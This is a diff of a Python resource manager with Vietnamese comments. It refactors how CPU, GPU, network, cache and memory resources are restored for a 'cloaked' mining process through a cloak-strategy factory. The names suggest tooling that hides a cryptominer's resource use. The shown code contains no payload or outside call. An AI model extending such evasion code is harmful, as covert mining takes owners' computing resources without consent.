@@ -221,7 +221,7 @@ class SharedResourceManager:
 
     def restore_resources(self, process: MiningProcess):
         """
-        Khôi phục tài nguyên (CPU, GPU...) cho tiến trình đã cloaked.
+        Khôi phục tài nguyên (CPU, GPU, Cache, Network...) cho tiến trình đã cloaked.
 
         :param process: Đối tượng MiningProcess.
         """
@@ -230,13 +230,26 @@ class SharedResourceManager:
             name = process.name
             restored = False
 
-            for controller_name, manager in self.resource_managers.items():
-                success = manager.restore_resources(pid)
-                if success:
-                    self.logger.info(f"Đã khôi phục tài nguyên '{controller_name}' cho PID={pid}.")
+            # Duyệt qua các chiến lược được hỗ trợ
+            for strategy_name in ['cpu', 'gpu', 'network', 'disk_io', 'cache', 'memory']:
+                # Tạo chiến lược tương ứng từ factory
+                strategy = CloakStrategyFactory.create_strategy(
+                    strategy_name,
+                    self.config,
+                    self.logger,
+                    self.resource_managers
+                )
+                if not strategy:
+                    self.logger.warning(f"Không thể tạo chiến lược {strategy_name} cho PID={pid}.")
+                    continue
+
+                try:
+                    # Gọi hàm restore trên chiến lược
+                    strategy.restore(process)
+                    self.logger.info(f"Đã khôi phục tài nguyên '{strategy_name}' cho PID={pid}.")
                     restored = True
-                else:
-                    self.logger.error(f"Không thể khôi phục tài nguyên '{controller_name}' cho PID={pid}.")
+                except Exception as e:
+                    self.logger.error(f"Lỗi khi khôi phục tài nguyên '{strategy_name}' cho PID={pid}: {e}")
 
             if restored:
                 self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID={pid}).")
@@ -249,7 +262,6 @@ class SharedResourceManager:
         except Exception as e:
             self.logger.error(f"Lỗi khi khôi phục tài nguyên cho {name} (PID={pid}): {e}\n{traceback.format_exc()}")
             raise
-
 
 class ResourceManager(IResourceManager):
     """
